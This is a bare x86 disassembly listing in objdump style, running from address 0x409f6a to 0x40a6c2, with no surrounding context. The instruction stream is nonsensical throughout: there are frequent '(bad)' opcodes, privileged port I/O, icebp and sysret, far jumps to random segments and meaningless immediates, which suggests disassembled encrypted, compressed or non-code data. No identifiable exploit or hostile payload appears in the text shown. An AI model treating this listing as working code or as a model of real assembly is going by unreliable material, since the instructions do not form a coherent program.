  409f6a:	add    edi,DWORD PTR [edx-0x74]
  409f6d:	mov    ds,WORD PTR [edx+esi*1]
  409f70:	in     al,0x1e
  409f72:	mov    ah,0xe3
  409f74:	icebp  
  409f75:	cmp    eax,0x2071a9ae
  409f7a:	rcr    BYTE PTR [edx+0x3dd1f9b7],1
  409f80:	mov    esi,0xc673560d
  409f85:	jne    0x409f38
  409f87:	mov    edi,0x1e73079b
  409f8c:	sbb    eax,0xebbcd041
  409f91:	scas   eax,DWORD PTR es:[edi]
  409f92:	fistp  DWORD PTR [eax-0x53fc6edb]
  409f98:	push   ecx
  409f99:	fisttp DWORD PTR [edi+ebp*1]
  409f9c:	lods   eax,DWORD PTR ds:[esi]
  409f9d:	inc    edx
  409f9e:	jp     0x40a00c
  409fa0:	or     ecx,0x4d5a833b
  409fa6:	sar    BYTE PTR [esi],cl
  409fa8:	dec    ebx
  409fa9:	and    al,0xf3
  409fab:	push   ebp
  409fac:	xchg   esp,eax
  409fad:	jmp    0x9069:0xd894c93f
  409fb4:	add    DWORD PTR [eax+0x9a8afd6],edi
  409fba:	or     BYTE PTR [ebp+0x6186229f],al
  409fc0:	nop
  409fc1:	mov    bl,0xea
  409fc3:	jo     0x409f56
  409fc5:	(bad)  
  409fc6:	int3   
  409fc7:	cmp    BYTE PTR [eax+0x14f972c3],dl
  409fcd:	(bad)  
  409fce:	cli    
  409fcf:	adc    eax,0xbab404a5
  409fd4:	adc    bh,BYTE PTR [ebp-0x6e]
  409fd7:	adc    esi,DWORD PTR [eiz*1+0x613b074d]
  409fde:	fs jg  0x40a006
  409fe1:	push   0x4d
  409fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe4:	repnz stc 
  409fe6:	stos   DWORD PTR es:[edi],eax
  409fe7:	and    al,BYTE PTR ds:0x367903b1
  409fed:	jae    0x409f80
  409fef:	adc    eax,0x40d3d34d
  409ff4:	jp     0x409fac
  409ff6:	clc    
  409ff7:	outs   dx,BYTE PTR ds:[esi]
  409ff8:	outs   dx,DWORD PTR ds:[esi]
  409ff9:	jne    0x40a021
  409ffb:	out    0x91,al
  409ffd:	fild   QWORD PTR [ecx+ecx*4-0x25f21ae4]
  40a004:	dec    esi
  40a005:	add    DWORD PTR ss:[esi],eax
  40a008:	jns    0x40a086
  40a00a:	jg     0x40a017
  40a00c:	mov    ebx,DWORD PTR [ebp-0x50]
  40a00f:	xor    DWORD PTR [ecx+0x5c],esi
  40a012:	inc    edx
  40a013:	push   esi
  40a014:	call   0x4f8:0xbab6f1fa
  40a01b:	xor    BYTE PTR [ecx+0x63719ae1],0x88
  40a022:	xchg   esi,eax
  40a023:	clc    
  40a024:	div    DWORD PTR [ebx-0x40]
  40a027:	push   ebp
  40a028:	mov    ebp,0xf2446bc0
  40a02d:	mov    esp,0xea67097f
  40a032:	dec    ebp
  40a033:	mov    ebx,DWORD PTR [ebx+0x2a490e72]
  40a039:	mov    ds,WORD PTR [ecx]
  40a03b:	adc    al,0xfa
  40a03d:	dec    ecx
  40a03e:	push   edi
  40a03f:	mul    bl
  40a041:	mov    bl,0xf0
  40a043:	scas   eax,DWORD PTR es:[edi]
  40a044:	(bad)  
  40a046:	xor    al,0x7a
  40a048:	scas   al,BYTE PTR es:[edi]
  40a049:	sti    
  40a04a:	imul   ecx,DWORD PTR [ecx+0x26f9fa73],0x99476bca
  40a054:	dec    ebx
  40a055:	cmp    eax,0x564fd71b
  40a05a:	push   esp
  40a05b:	xchg   ecx,eax
  40a05c:	mov    al,ds:0xe9e4295a
  40a061:	jnp    0x40a086
  40a063:	pop    esi
  40a064:	inc    edx
  40a065:	and    DWORD PTR [edi],esi
  40a067:	loopne 0x40a083
  40a069:	in     eax,dx
  40a06a:	push   ecx
  40a06b:	xor    ebx,DWORD PTR [edx+0x66647118]
  40a071:	ret    
  40a072:	push   es
  40a073:	inc    edx
  40a074:	aas    
  40a075:	jno    0x40a099
  40a077:	in     eax,dx
  40a078:	daa    
  40a079:	out    0xb6,eax
  40a07b:	nop
  40a07c:	arpl   WORD PTR [edx],bp
  40a07e:	adc    eax,DWORD PTR [ecx+0x71ae3868]
  40a084:	sbb    ebx,DWORD PTR [ecx+0x7b]
  40a087:	in     eax,dx
  40a088:	push   esi
  40a089:	arpl   WORD PTR [eax],bp
  40a08b:	adc    edi,esi
  40a08d:	dec    ebx
  40a08e:	lods   eax,DWORD PTR ds:[esi]
  40a08f:	fwait
  40a090:	pop    eax
  40a091:	xchg   esi,eax
  40a092:	lock hlt 
  40a094:	mov    esp,0xe8a929fe
  40a099:	push   es
  40a09a:	push   edx
  40a09b:	add    al,0x2a
  40a09d:	mov    BYTE PTR [ebp-0x586c76a8],bh
  40a0a3:	js     0x40a102
  40a0a5:	mov    ecx,0xc80c8a6f
  40a0aa:	xlat   BYTE PTR ds:[ebx]
  40a0ab:	mov    cl,0x27
  40a0ad:	loope  0x40a0e4
  40a0af:	sub    bh,BYTE PTR [ebx-0x59ddd2b0]
  40a0b5:	xor    DWORD PTR [edx],ebx
  40a0b7:	fisttp WORD PTR [ecx+edi*4]
  40a0ba:	sbb    BYTE PTR [edx-0x26b7a6ba],cl
  40a0c0:	dec    esp
  40a0c1:	jns    0x40a10b
  40a0c3:	sub    bl,bl
  40a0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0c6:	adc    edi,DWORD PTR [ecx+0x6d541e82]
  40a0cc:	and    WORD PTR [esi-0x5b],bx
  40a0d0:	loopne 0x40a07e
  40a0d2:	cmp    al,0xb7
  40a0d4:	cmp    al,0x4
  40a0d6:	pop    edx
  40a0d7:	in     al,dx
  40a0d8:	pop    esi
  40a0d9:	xlat   BYTE PTR ds:[ebx]
  40a0da:	pop    edx
  40a0db:	inc    eax
  40a0dc:	cmp    ch,BYTE PTR [esi-0x8edc0f7]
  40a0e2:	lods   al,BYTE PTR ds:[esi]
  40a0e3:	inc    esp
  40a0e4:	aaa    
  40a0e5:	mov    edi,0x38b83a02
  40a0ea:	xor    al,0x0
  40a0ec:	into   
  40a0ed:	sbb    BYTE PTR [ebx-0x51],0xee
  40a0f1:	push   0xfffffffb
  40a0f3:	mov    WORD PTR [bx+0x5e85],?
  40a0f8:	nop
  40a0f9:	sbb    eax,0xb391bcba
  40a0fe:	ins    BYTE PTR es:[edi],dx
  40a0ff:	(bad)  
  40a100:	or     ebp,DWORD PTR [ecx-0xc0bf11d]
  40a106:	in     eax,0x9b
  40a108:	xchg   esp,eax
  40a109:	in     al,dx
  40a10a:	fnsave [edi]
  40a10c:	cmp    eax,0x53cbbd8b
  40a111:	push   eax
  40a112:	test   eax,0x2c3cbe21
  40a117:	cvtps2pi mm0,QWORD PTR [edx+0x3b629346]
  40a11e:	(bad)
  40a122:	pop    eax
  40a123:	mov    dl,0x3a
  40a125:	jmp    FWORD PTR [esi]
  40a127:	xlat   BYTE PTR ds:[ebx]
  40a128:	pushf  
  40a129:	je     0x40a0c0
  40a12b:	push   0x48
  40a12d:	xor    al,0xf9
  40a12f:	jbe    0x40a101
  40a131:	add    BYTE PTR [ebx],bh
  40a133:	and    esp,eax
  40a135:	sbb    dl,dl
  40a137:	arpl   bx,bx
  40a139:	xor    eax,0x748eac42
  40a13e:	sub    bh,dl
  40a140:	ins    BYTE PTR es:[edi],dx
  40a141:	call   0x70066576
  40a146:	ja     0x40a1a2
  40a148:	sar    BYTE PTR [ebx+0x4d05fc85],1
  40a14e:	pop    edi
  40a14f:	pop    edx
  40a150:	mov    al,ds:0xe61f6dea
  40a155:	or     BYTE PTR ds:0x19ef7d4c,bh
  40a15b:	inc    eax
  40a15c:	out    dx,eax
  40a15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15e:	popa   
  40a15f:	out    0x52,al
  40a161:	inc    eax
  40a162:	jae    0x40a112
  40a164:	jp     0x40a183
  40a166:	sub    al,0xb6
  40a168:	mov    ebx,DWORD PTR ds:0x8bf8a64
  40a16e:	jo     0x40a1ce
  40a170:	int    0x1e
  40a172:	fs pop esi
  40a174:	ins    DWORD PTR es:[edi],dx
  40a175:	into   
  40a176:	enter  0xded9,0xd6
  40a17a:	(bad)  
  40a17b:	jae    0x40a1f8
  40a17d:	pop    ebp
  40a17e:	cdq    
  40a17f:	in     eax,dx
  40a180:	jmp    0x40a15c
  40a182:	pop    esp
  40a183:	xlat   BYTE PTR ds:[ebx]
  40a184:	fs or  bl,ah
  40a187:	sbb    al,0xb4
  40a189:	pop    ebp
  40a18a:	ins    DWORD PTR es:[edi],dx
  40a18b:	in     eax,dx
  40a18c:	out    0x60,al
  40a18e:	cs (bad) 
  40a190:	jle    0x40a16a
  40a192:	mov    edx,0x46997690
  40a197:	in     al,0xad
  40a199:	lock fcmovnb st,st(2)
  40a19c:	mov    al,ds:0xa874de3a
  40a1a1:	xchg   DWORD PTR [edi-0x6a],ecx
  40a1a4:	ss fwait
  40a1a6:	leave  
  40a1a7:	dec    ebx
  40a1a8:	out    0xb6,eax
  40a1aa:	fsub   st(3),st
  40a1ac:	fld    QWORD PTR [ebx+edi*2]
  40a1af:	dec    ebx
  40a1b0:	jg     0x40a15b
  40a1b2:	xchg   DWORD PTR [esi],ecx
  40a1b4:	ins    BYTE PTR es:[edi],dx
  40a1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b6:	bound  esi,QWORD PTR [esi-0x8]
  40a1b9:	imul   edx,DWORD PTR ds:0xa7ec833d,0x16
  40a1c0:	fdiv   DWORD PTR [edi-0x18]
  40a1c3:	cmp    al,0xb
  40a1c5:	(bad)  
  40a1c6:	xor    BYTE PTR [ecx],ah
  40a1c8:	mov    gs,WORD PTR [edx+0x76]
  40a1cb:	jo     0x40a180
  40a1cd:	shr    edx,1
  40a1cf:	add    ecx,0x48
  40a1d2:	int    0x58
  40a1d4:	sbb    ecx,esi
  40a1d6:	mov    ds:0x12c853a7,al
  40a1db:	push   edi
  40a1dc:	mov    bl,0x45
  40a1de:	test   BYTE PTR [ecx-0x36],0xbc
  40a1e2:	sub    al,0xd3
  40a1e4:	cdq    
  40a1e5:	cs pushf 
  40a1e7:	push   eax
  40a1e8:	pop    ebx
  40a1e9:	fld    st(7)
  40a1eb:	mov    bh,0x5b
  40a1ed:	dec    ebx
  40a1ee:	push   edi
  40a1ef:	and    DWORD PTR [edi+ebp*2+0x7a0d1de],ebp
  40a1f6:	lea    esi,[esi-0x249013cd]
  40a1fc:	outs   dx,DWORD PTR ds:[esi]
  40a1fd:	adc    DWORD PTR [ebx],ebp
  40a1ff:	sub    BYTE PTR [edx+0x7c],0xf8
  40a203:	fwait
  40a204:	pop    esp
  40a205:	popa   
  40a206:	icebp  
  40a207:	xor    ax,0x7a55
  40a20b:	dec    eax
  40a20c:	dec    edx
  40a20d:	mov    ch,0x4f
  40a20f:	inc    edi
  40a210:	xchg   ebp,eax
  40a211:	outs   dx,BYTE PTR ds:[esi]
  40a212:	aad    0x1e
  40a214:	iret   
  40a215:	nop
  40a216:	sub    eax,0xec309a4
  40a21b:	sbb    ch,bh
  40a21d:	retf   0xce53
  40a220:	inc    ebp
  40a221:	xor    BYTE PTR [eax+ecx*2],0x8f
  40a225:	push   ecx
  40a226:	repz sbb edx,edi
  40a229:	nop
  40a22a:	sbb    BYTE PTR [ebx+0x26b6b1fe],ah
  40a230:	push   eax
  40a231:	inc    ebx
  40a232:	mov    eax,ds:0x43ff6f1
  40a237:	lahf   
  40a238:	inc    edx
  40a239:	mov    ebp,0xf501041b
  40a23e:	adc    DWORD PTR [ecx+0x70],esp
  40a241:	mov    al,ds:0x534279eb
  40a246:	jecxz  0x40a1e9
  40a248:	test   BYTE PTR [ecx],bh
  40a24a:	pop    ebx
  40a24b:	ss dec edx
  40a24d:	and    DWORD PTR [esp+edx*4],0x4a
  40a251:	inc    ebx
  40a252:	pop    esp
  40a253:	loope  0x40a1f8
  40a255:	mov    ds:0xcc2c62dd,al
  40a25a:	sbb    DWORD PTR [esi],esi
  40a25c:	mov    edi,0x7462d926
  40a261:	shl    DWORD PTR [edi+ebx*1-0x24],0x48
  40a266:	jo     0x40a24e
  40a268:	gs sysret 
  40a26b:	lds    ebx,FWORD PTR [edx-0x2f]
  40a26e:	push   ds
  40a26f:	jecxz  0x40a2a2
  40a271:	stos   BYTE PTR es:[edi],al
  40a272:	sub    eax,0xb5b2596b
  40a277:	dec    esp
  40a278:	or     esp,eax
  40a27a:	xchg   esp,eax
  40a27b:	mov    al,ds:0x3f85e3d1
  40a280:	sar    BYTE PTR [edx+0xe393435],cl
  40a286:	jo     0x40a27a
  40a288:	push   es
  40a289:	sahf   
  40a28a:	iret   
  40a28b:	scas   eax,DWORD PTR es:[edi]
  40a28c:	xor    al,0x45
  40a28e:	adc    eax,0x641df381
  40a293:	in     al,0x8e
  40a295:	mov    cl,0xd0
  40a297:	sub    cl,cl
  40a299:	in     al,dx
  40a29a:	mov    al,0xf0
  40a29c:	das    
  40a29d:	xchg   edx,eax
  40a29e:	pop    ebp
  40a29f:	ret    0xa19d
  40a2a2:	jge    0x40a320
  40a2a4:	js     0x40a26c
  40a2a6:	sub    eax,0x6efd5992
  40a2ab:	xor    BYTE PTR [ebx+esi*1+0x57234b14],ah
  40a2b2:	lods   eax,DWORD PTR ds:[esi]
  40a2b3:	in     eax,0xe
  40a2b5:	add    eax,0x4dccbc76
  40a2ba:	imul   edx,DWORD PTR [ebx+ecx*2+0x57],0x3e
  40a2bf:	ror    DWORD PTR [edi],1
  40a2c1:	jns    0x40a246
  40a2c3:	xor    BYTE PTR [eax-0x9],al
  40a2c6:	shl    DWORD PTR ds:0xb5cb13b4,0xaa
  40a2cd:	jno    0x40a273
  40a2cf:	scas   al,BYTE PTR es:[edi]
  40a2d0:	out    0x41,al
  40a2d2:	cmp    al,0x9e
  40a2d4:	das    
  40a2d5:	jl     0x40a2a5
  40a2d7:	test   al,0x6d
  40a2d9:	lods   eax,DWORD PTR ds:[esi]
  40a2da:	sub    eax,0xe813e4db
  40a2df:	cld    
  40a2e0:	sbb    al,0x1e
  40a2e2:	idiv   BYTE PTR [eax-0x2eba5ad3]
  40a2e8:	mov    ebx,0x8ad585a7
  40a2ed:	bound  edx,QWORD PTR [esi+0x526fdf1a]
  40a2f3:	cmp    cl,ah
  40a2f5:	jae    0x40a2e7
  40a2f7:	cs je  0x40a2f4
  40a2fa:	loop   0x40a30e
  40a2fc:	mov    ebp,0x79ed7230
  40a301:	jns    0x40a307
  40a303:	dec    ebx
  40a304:	leave  
  40a305:	call   0x5376:0xab99bca5
  40a30c:	fidivr DWORD PTR [ebx-0x3d0ba0b1]
  40a312:	lea    esi,[esi]
  40a314:	or     ch,al
  40a316:	push   ebp
  40a317:	test   BYTE PTR [esi+ebx*1+0x4c],ah
  40a31b:	out    dx,eax
  40a31c:	sti    
  40a31d:	int3   
  40a31e:	cld    
  40a31f:	and    eax,0x51d14423
  40a324:	out    0xcc,al
  40a326:	fwait
  40a327:	cwde   
  40a328:	mov    ecx,0x8880b685
  40a32d:	lods   eax,DWORD PTR ds:[esi]
  40a32e:	pop    eax
  40a32f:	adc    BYTE PTR [edi],al
  40a331:	mov    bl,0x7a
  40a333:	pop    edx
  40a334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a335:	popa   
  40a336:	or     BYTE PTR [edi],dl
  40a338:	mov    ch,BYTE PTR [edi+eax*1+0x0]
  40a33c:	add    DWORD PTR [esp+ebp*2-0x36],esi
  40a340:	fcmovb st,st(7)
  40a342:	add    eax,0xb4682fcd
  40a347:	or     edi,DWORD PTR [edx]
  40a349:	adc    BYTE PTR [ebx-0x3620cc04],0xcc
  40a350:	test   al,0xbe
  40a352:	mov    ds:0xc6bc3c24,al
  40a357:	jp     0x40a3a4
  40a359:	dec    ecx
  40a35a:	int    0xdf
  40a35c:	call   0x5e68b3b4
  40a361:	iret   
  40a362:	and    BYTE PTR [eax-0x3efb0aa3],al
  40a368:	nop
  40a369:	into   
  40a36a:	mov    ebp,0x138c7dc0
  40a36f:	push   ss
  40a370:	out    dx,eax
  40a371:	cld    
  40a372:	xchg   esi,eax
  40a373:	call   0xffb6:0x3564e756
  40a37a:	mov    dh,bl
  40a37c:	out    0x32,eax
  40a37e:	popa   
  40a37f:	adc    al,0x69
  40a381:	mov    esp,DWORD PTR [eax+0x4d4c6206]
  40a387:	push   ebp
  40a388:	(bad)  
  40a389:	cli    
  40a38a:	xchg   ebx,esp
  40a38c:	popa   
  40a38d:	(bad)  
  40a38e:	mov    WORD PTR [ecx+0x55],ds
  40a391:	jbe    0x40a336
  40a393:	comiss xmm7,DWORD PTR [esi-0x3e]
  40a397:	in     al,dx
  40a398:	popf   
  40a399:	scas   al,BYTE PTR es:[edi]
  40a39a:	mov    dh,0xd4
  40a39c:	rol    DWORD PTR [edx-0x704811c3],1
  40a3a2:	mov    cl,0xb4
  40a3a4:	and    cl,ch
  40a3a6:	dec    ecx
  40a3a7:	inc    ecx
  40a3a8:	aas    
  40a3a9:	sub    al,0x5b
  40a3ab:	ins    BYTE PTR es:[edi],dx
  40a3ac:	ins    BYTE PTR es:[edi],dx
  40a3ad:	xchg   ebp,eax
  40a3ae:	scas   eax,DWORD PTR es:[edi]
  40a3af:	and    BYTE PTR [ebp-0x2efb0db4],0x37
  40a3b6:	mov    dh,0x85
  40a3b8:	pusha  
  40a3b9:	inc    ecx
  40a3ba:	popf   
  40a3bb:	in     al,0x4
  40a3bd:	adc    dl,BYTE PTR [edi]
  40a3bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c0:	push   edx
  40a3c1:	(bad)  
  40a3c3:	imul   ecx,DWORD PTR [ebp-0x31],0x5f
  40a3c7:	test   DWORD PTR [eax-0x49],0xe781fc38
  40a3ce:	jb     0x40a425
  40a3d0:	push   es
  40a3d1:	bound  ebx,QWORD PTR [ebp+0xe4f7d54]
  40a3d7:	pushf  
  40a3d8:	in     al,0xe8
  40a3da:	fwait
  40a3db:	xchg   ecx,eax
  40a3dc:	repz jns 0x40a42f
  40a3df:	cs and ecx,ecx
  40a3e2:	xchg   esp,eax
  40a3e3:	adc    DWORD PTR [esi],edi
  40a3e5:	pop    esi
  40a3e6:	mov    BYTE PTR [edx+0x1dcb1628],al
  40a3ec:	mov    eax,ds:0xbdd751e1
  40a3f1:	int3   
  40a3f2:	out    dx,eax
  40a3f3:	add    eax,0x46feacf9
  40a3f8:	into   
  40a3f9:	sbb    DWORD PTR [edi-0x68],esi
  40a3fc:	ret    
  40a3fd:	icebp  
  40a3fe:	mov    edi,0x20e53052
  40a403:	add    bl,BYTE PTR [ebx]
  40a405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a406:	jmp    0x1063fffe
  40a40b:	imul   esp,DWORD PTR [edx-0x42],0xffffffd6
  40a40f:	mov    eax,ds:0x7f055bb5
  40a414:	add    BYTE PTR [esi+0x6c896dbb],bh
  40a41a:	scas   al,BYTE PTR es:[edi]
  40a41b:	clc    
  40a41c:	cmp    BYTE PTR [ebx+0x10ebd8af],ah
  40a422:	and    eax,0x3cf5a272
  40a427:	mov    BYTE PTR [esi-0x73b27a82],ch
  40a42d:	aas    
  40a42e:	pop    edi
  40a42f:	cmp    eax,0x30004779
  40a434:	popa   
  40a435:	xchg   ecx,eax
  40a436:	mov    ecx,DWORD PTR [edx]
  40a438:	call   0x4f31643f
  40a43d:	js     0x40a3ec
  40a43f:	cmc    
  40a440:	jl     0x40a3fc
  40a442:	sbb    ebx,ebp
  40a444:	ins    DWORD PTR es:[edi],dx
  40a445:	sub    edx,DWORD PTR [ecx+ebx*8-0x4ce11262]
  40a44c:	sub    eax,0xa95cd67d
  40a451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a452:	rcl    DWORD PTR ds:0xec5f3fb2,1
  40a458:	mov    cl,0x87
  40a45a:	jnp    0x40a3e8
  40a45c:	mov    ecx,ecx
  40a45e:	(bad)  
  40a45f:	mov    dh,0x10
  40a461:	xchg   edi,eax
  40a462:	push   0xf6e9d437
  40a467:	les    ecx,FWORD PTR [eax+esi*8+0x37]
  40a46b:	int    0xbb
  40a46d:	jmp    0x40a44a
  40a46f:	jmp    0xdc54:0x2b3631b2
  40a476:	ins    DWORD PTR es:[edi],dx
  40a477:	mov    esi,0xf80136a1
  40a47c:	cmp    al,0xea
  40a47e:	adc    eax,0x763c136a
  40a483:	std    
  40a484:	jnp    0x40a4d5
  40a486:	pusha  
  40a487:	and    dl,BYTE PTR [ebx+0x3a]
  40a48a:	sbb    DWORD PTR [edi-0x4e3511f7],ecx
  40a490:	mov    dl,BYTE PTR [ecx]
  40a492:	fisttp WORD PTR [edx+0x49df00ab]
  40a498:	stc    
  40a499:	jno    0x40a4dd
  40a49b:	stos   BYTE PTR es:[edi],al
  40a49c:	jge    0x40a4f3
  40a49e:	inc    edi
  40a49f:	or     ecx,eax
  40a4a1:	mov    edx,ecx
  40a4a3:	ror    BYTE PTR [eax+eax*1-0x69],cl
  40a4a7:	inc    eax
  40a4a8:	cmp    al,0xdf
  40a4aa:	xchg   esp,eax
  40a4ab:	or     ebp,esi
  40a4ad:	das    
  40a4ae:	pop    ebx
  40a4af:	cmp    ah,dl
  40a4b1:	dec    edx
  40a4b2:	cld    
  40a4b3:	xchg   edx,eax
  40a4b4:	stos   BYTE PTR es:[edi],al
  40a4b5:	sbb    BYTE PTR [esi-0x3b],0xa
  40a4b9:	push   eax
  40a4ba:	pop    ss
  40a4bb:	xchg   ebp,eax
  40a4bc:	mov    bl,0x31
  40a4be:	dec    edi
  40a4bf:	lea    ebx,[edx+0x6627b8d5]
  40a4c5:	xchg   ah,dh
  40a4c7:	cmp    esp,ebp
  40a4c9:	push   0xbad0ab4d
  40a4ce:	int    0xb4
  40a4d0:	imul   ebx,DWORD PTR ds:0x60bf73e2,0x15
  40a4d7:	mov    bh,0xa4
  40a4d9:	cdq    
  40a4da:	jae    0x40a4d6
  40a4dc:	lods   al,BYTE PTR ds:[esi]
  40a4dd:	enter  0xd206,0x93
  40a4e1:	add    ecx,DWORD PTR [esi]
  40a4e3:	sbb    ecx,DWORD PTR [edi]
  40a4e5:	xor    eax,0xb451987e
  40a4ea:	pop    ss
  40a4eb:	and    DWORD PTR [eax-0x7a],eax
  40a4ee:	fld    DWORD PTR [ebx+ebp*2+0x3]
  40a4f2:	fcom   DWORD PTR [edi*2-0x3c725313]
  40a4f9:	cmp    ah,BYTE PTR [ebx]
  40a4fb:	dec    ecx
  40a4fc:	dec    ebp
  40a4fd:	jne    0x40a4a4
  40a4ff:	aas    
  40a500:	sub    al,0x50
  40a502:	sbb    bh,al
  40a504:	popf   
  40a505:	retf   
  40a506:	cmp    BYTE PTR [ebp-0x15],al
  40a509:	xchg   esi,eax
  40a50a:	inc    ecx
  40a50b:	inc    esp
  40a50c:	aas    
  40a50d:	push   ebp
  40a50e:	rcr    DWORD PTR [edi],1
  40a510:	test   DWORD PTR [ebp+0x4a74e881],edx
  40a516:	(bad)  
  40a518:	sbb    BYTE PTR [edx+0x63c30f],ch
  40a51e:	mov    cl,0x6a
  40a520:	test   bl,0xf6
  40a523:	data16 sti 
  40a525:	inc    esi
  40a526:	pop    esp
  40a527:	push   ss
  40a528:	es and al,0x2
  40a52b:	cli    
  40a52c:	das    
  40a52d:	add    BYTE PTR [edx+edx*8-0x2d6fa776],bl
  40a534:	(bad)  
  40a535:	jae    0x40a4cd
  40a537:	test   BYTE PTR [eax-0x62],al
  40a53a:	lahf   
  40a53b:	sub    al,0x77
  40a53d:	push   ecx
  40a53e:	add    al,0x1
  40a540:	cli    
  40a541:	jecxz  0x40a4dc
  40a543:	in     eax,0x9c
  40a545:	mov    eax,0x842d2e77
  40a54a:	mov    ds:0x8cf90de0,al
  40a54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a550:	xchg   BYTE PTR [ecx+0x7c2a2143],ah
  40a556:	scas   eax,DWORD PTR es:[edi]
  40a557:	and    al,0x2b
  40a559:	(bad)  
  40a55a:	mov    bl,0xf1
  40a55c:	test   DWORD PTR [eax*2+0x1af16283],esp
  40a563:	jne    0x40a500
  40a565:	mov    al,ds:0x3770bfbd
  40a56a:	or     dh,ah
  40a56c:	popf   
  40a56d:	mov    BYTE PTR [eax+0x66],ah
  40a570:	fsubr  QWORD PTR [ecx]
  40a572:	(bad)  [ecx+0x59]
  40a575:	push   edx
  40a576:	xor    dl,bh
  40a578:	and    cl,BYTE PTR [ebp+ebx*1+0x74]
  40a57c:	dec    edx
  40a57d:	lahf   
  40a57e:	mov    es,eax
  40a580:	and    al,BYTE PTR [ebp-0x27f9488b]
  40a586:	jl     0x40a56b
  40a588:	pop    es
  40a589:	inc    ebp
  40a58a:	addr16 cwde 
  40a58c:	jae    0x40a58c
  40a58e:	adc    DWORD PTR [edi],0xffffffa1
  40a591:	dec    ecx
  40a592:	add    DWORD PTR [eax+ebp*8-0x3da60357],edi
  40a599:	cmp    BYTE PTR [ebx+0x52],al
  40a59c:	in     al,dx
  40a59d:	js     0x40a55c
  40a59f:	sub    al,0x40
  40a5a1:	jp     0x40a59f
  40a5a3:	xchg   ebp,eax
  40a5a4:	sbb    BYTE PTR [ebp+0x7614c4cd],bh
  40a5aa:	test   eax,0xc8fb9fcc
  40a5af:	aam    0x5
  40a5b1:	daa    
  40a5b2:	cmp    DWORD PTR [esi-0x49e56731],ecx
  40a5b8:	pop    edi
  40a5b9:	ja     0x40a547
  40a5bb:	fcomp  DWORD PTR [ecx-0x4a4b4b2e]
  40a5c1:	jmp    0xfa30:0xf854a39f
  40a5c8:	aaa    
  40a5c9:	out    0x6b,al
  40a5cb:	int    0x6f
  40a5cd:	dec    DWORD PTR [edi+0x4762a3c6]
  40a5d3:	test   eax,0xe59ca1c
  40a5d8:	mov    al,gs:0xce545672
  40a5de:	stos   DWORD PTR es:[edi],eax
  40a5df:	pop    ds
  40a5e0:	or     bh,BYTE PTR [edx+edx*8+0x37]
  40a5e4:	(bad)  
  40a5e5:	out    0x1f,eax
  40a5e7:	int    0xae
  40a5e9:	sub    edi,ecx
  40a5eb:	out    dx,al
  40a5ec:	xchg   esi,eax
  40a5ed:	inc    ebp
  40a5ee:	mov    dl,0x7a
  40a5f0:	cs pop esi
  40a5f2:	int    0x7
  40a5f4:	ret    0xdad7
  40a5f7:	out    dx,al
  40a5f8:	mov    edi,0x28d1f412
  40a5fd:	push   ecx
  40a5fe:	in     eax,dx
  40a5ff:	or     eax,0x83da4e51
  40a604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a605:	jg     0x40a5a7
  40a607:	dec    eax
  40a608:	sbb    DWORD PTR [ebx+0x71],esp
  40a60b:	outs   dx,BYTE PTR ds:[esi]
  40a60c:	cwde   
  40a60d:	add    ah,BYTE PTR ds:0xfc4046cf
  40a613:	xchg   ecx,eax
  40a614:	enter  0x971e,0xcc
  40a618:	dec    edi
  40a619:	cwde   
  40a61a:	ror    DWORD PTR [edi+eax*4],cl
  40a61d:	cld    
  40a61e:	aad    0xbf
  40a620:	test   BYTE PTR [edi],ah
  40a622:	es mov ecx,0x6824010e
  40a628:	adc    edi,esp
  40a62a:	(bad)  
  40a62b:	sahf   
  40a62c:	lea    esp,[ebp-0x69]
  40a62f:	mov    bl,0xe1
  40a631:	call   0x5e20bba4
  40a636:	fdiv   DWORD PTR [edi-0x7]
  40a639:	int    0x2
  40a63b:	inc    edx
  40a63c:	lahf   
  40a63d:	stos   DWORD PTR es:[edi],eax
  40a63e:	jne    0x40a652
  40a640:	mov    ds:0x5faf32d6,eax
  40a645:	ss jecxz 0x40a62f
  40a648:	sti    
  40a649:	clc    
  40a64a:	(bad)  
  40a64c:	into   
  40a64d:	ss loopne 0x40a648
  40a650:	ja     0x40a6cb
  40a652:	loope  0x40a67a
  40a654:	xchg   esi,eax
  40a655:	mov    cl,0xaa
  40a657:	inc    esi
  40a658:	sbb    ebx,ebp
  40a65a:	aas    
  40a65b:	xchg   esi,eax
  40a65d:	add    eax,0x408f9824
  40a662:	sbb    DWORD PTR [edx-0x25],edx
  40a665:	push   edi
  40a666:	js     0x40a6bb
  40a668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a669:	iret   
  40a66a:	jns    0x40a6cd
  40a66c:	mov    eax,0x7029f7c7
  40a671:	mov    dh,0xbc
  40a673:	xlat   BYTE PTR ds:[ebx]
  40a674:	sbb    eax,DWORD PTR [eax]
  40a676:	xchg   cl,bl
  40a678:	jle    0x40a64c
  40a67a:	push   edx
  40a67c:	icebp  
  40a67d:	test   al,0x89
  40a67f:	push   ecx
  40a680:	push   esp
  40a681:	imul   esi,DWORD PTR [eax-0x6],0xa33b69b2
  40a688:	mov    edx,0xf7879192
  40a68d:	sub    eax,eax
  40a68f:	pop    eax
  40a690:	into   
  40a691:	mov    al,ds:0xfa82d91a
  40a696:	loopne 0x40a630
  40a698:	dec    ebx
  40a699:	mov    eax,ds:0x1c1e1a71
  40a69e:	jns    0x40a6ee
  40a6a0:	add    DWORD PTR [esi+0x50],eax
  40a6a3:	push   ss
  40a6a4:	hlt    
  40a6a5:	push   es
  40a6a6:	xor    BYTE PTR [edx-0x4fa93850],dl
  40a6ac:	cdq    
  40a6ad:	mov    DWORD PTR [ebx-0x53ab54d0],ebp
  40a6b3:	fld    TBYTE PTR [ebp+0x54]
  40a6b6:	(bad)  
  40a6b7:	fild   WORD PTR [edi-0x3e]
  40a6ba:	jb     0x40a684
  40a6bc:	sahf   
  40a6bd:	xchg   DWORD PTR [ebp+0xc],ebp
  40a6c0:	lods   al,BYTE PTR ds:[esi]
  40a6c1:	pop    edi
  40a6c2:	adc    DWORD PTR [edx-0x45],esi
